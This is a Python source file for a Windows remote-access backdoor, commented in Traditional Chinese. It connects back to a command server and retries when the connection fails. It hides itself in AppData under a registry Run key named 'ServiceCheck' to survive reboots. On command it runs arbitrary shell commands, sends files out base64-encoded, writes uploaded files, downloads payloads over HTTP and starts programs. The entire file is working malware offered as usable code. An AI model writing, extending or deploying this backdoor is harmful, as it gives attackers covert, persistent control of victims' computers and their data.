#!/usr/bin/python3
import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import struct
import requests

SERVER_IP = "127.0.0.1"
SERVER_PORT = 12345
# 修正路徑拼接，改用 os.path.join 確保相容性
FILE_LOCATION = os.path.join(os.environ.get("appdata", "C:\\"), "srv.exe")

def reliable_send(s, data):
    json_data = json.dumps(data).encode("utf-8")
    data_len = struct.pack(">I", len(json_data))
    s.sendall(data_len + json_data)

def reliable_recv(s):
    try:
        header = s.recv(4)
        if not header:
            return None
        data_len = struct.unpack(">I", header)[0]
        
        data = bytearray()
        while len(data) < data_len:
            packet = s.recv(min(data_len - len(data), 4096))
            if not packet:
                return None
            data.extend(packet)
            
        return json.loads(data.decode("utf-8"))
    except (socket.error, json.JSONDecodeError):
        return None

def persist():
    """
    實現持久化 (Persistence)，複製自身到 AppData 並註冊登錄檔 (Registry)
    """
    try:
        if not os.path.exists(FILE_LOCATION):
            shutil.copyfile(sys.executable, FILE_LOCATION)
            # 使用 raw string 避免 Windows 路徑轉義錯誤
            cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v ServiceCheck /t REG_SZ /d "{FILE_LOCATION}" /f'
            subprocess.run(cmd, shell=True, capture_output=True)
    except Exception:
        pass

def communication(s):
    while True:
        command = reliable_recv(s)
        if command is None or command == 'q':
            break
            
        if command.startswith("cd ") and len(command) > 3:
            try:
                os.chdir(command[3:].strip())
                # 可以選擇回傳成功訊息，或保持原樣
            except OSError:
                continue
                
        elif command.startswith("download "):
            filename = command[9:].strip()
            try:
                with open(filename, "rb") as f:
                    content = f.read()
                    encoded = base64.b64encode(content).decode("ascii")
                    reliable_send(s, encoded)
            except Exception:
                reliable_send(s, "[!!] Failed to download: File not found or unreadable.")
                
        elif command.startswith("upload "):
            filename = command[7:].strip()
            result = reliable_recv(s)
            if result and not result.startswith("[!!]"):
                try:
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(result.encode("ascii")))
                except Exception:
                    pass
                    
        elif command.startswith("get "):
            url = command[4:].strip()
            try:
                response = requests.get(url, timeout=10)
                filename = url.split("/")[-1] if "/" in url else "downloaded_file"
                with open(filename, "wb") as f:
                    f.write(response.content)
                reliable_send(s, f"[+] File '{filename}' Downloaded via HTTP.")
            except Exception as e:
                reliable_send(s, f"[!!] HTTP Download Failed: {e}")
                
        elif command.startswith("start "):
            program = command[6:].strip()
            try:
                subprocess.Popen(program, shell=True)
                reliable_send(s, f"[+] Program '{program}' Started.")
            except Exception:
                reliable_send(s, "[!!] Program cannot start.")
                
        else:
            # 執行 Shell 指令並獲取結果
            try:
                proc = subprocess.Popen(
                    command, 
                    shell=True,
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                response = stdout + stderr
                # 優先嘗試 Windows 預設的 cp950 (繁體中文)，失敗則用 utf-8
                try:
                    decoded_response = response.decode('cp950')
                except UnicodeDecodeError:
                    decoded_response = response.decode('utf-8', errors='ignore')
                
                reliable_send(s, decoded_response)
            except Exception as e:
                reliable_send(s, f"[!!] Execution Error: {str(e)}")

def connection():
    while True:
        try:
            # 每次連線都建立一個新的 socket 實例
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                communication(s)
        except socket.error:
            # 連線失敗時，等待 20 秒後重試（確保不會因 Server 短暫關閉而崩潰退出）
            time.sleep(20)
            continue

if __name__ == "__main__":
    # 在進入主迴圈前嘗試執行持久化
    persist()
    connection()